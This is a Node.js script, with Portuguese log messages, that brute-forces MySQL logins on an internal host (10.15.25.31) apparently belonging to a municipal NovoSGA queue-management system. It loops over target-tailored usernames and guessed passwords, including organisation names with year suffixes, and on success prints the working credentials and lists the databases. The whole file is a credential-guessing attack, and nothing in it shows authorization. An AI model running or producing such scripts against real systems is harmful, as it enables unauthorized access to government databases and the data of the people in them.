const mysql = require('mysql2/promise');

async function testMoreCredentials() {
  const users = ['root', 'novosga', 'semit', 'admin', 'garca'];
  const passwords = [
    'novosga',
    'root',
    'semit',
    'garca',
    '123456',
    'Garca@2024',
    'Garca@2025',
    'Garca@2026',
    'Sem!t@2024',
    'Sem!t@2025',
    'Sem!t@2026',
    'prefeitura',
    'novosga123',
    '',
  ];
  const dbs = ['novosga', 'novosga2', 'painel', 'triagem', 'mysql'];

  for (const user of users) {
    for (const password of passwords) {
      try {
        const conn = await mysql.createConnection({
          host: '10.15.25.31',
          port: 3306,
          user,
          password,
          connectTimeout: 800,
        });
        console.log(`>>> SUCESSO MYSQL CONECTADO! user=${user} password=${password}`);
        const [databases] = await conn.execute('SHOW DATABASES');
        console.log('Bancos de dados no servidor NovoSGA:', databases);
        await conn.end();
        return { user, password };
      } catch (err) {
        if (!err.message.includes('Access denied') && !err.message.includes('ETIMEDOUT') && !err.message.includes('ECONNREFUSED')) {
          console.log(`Erro diferente com user=${user}:`, err.message);
        }
      }
    }
  }
  console.log('Fim da busca.');
}

testMoreCredentials().catch(console.error);
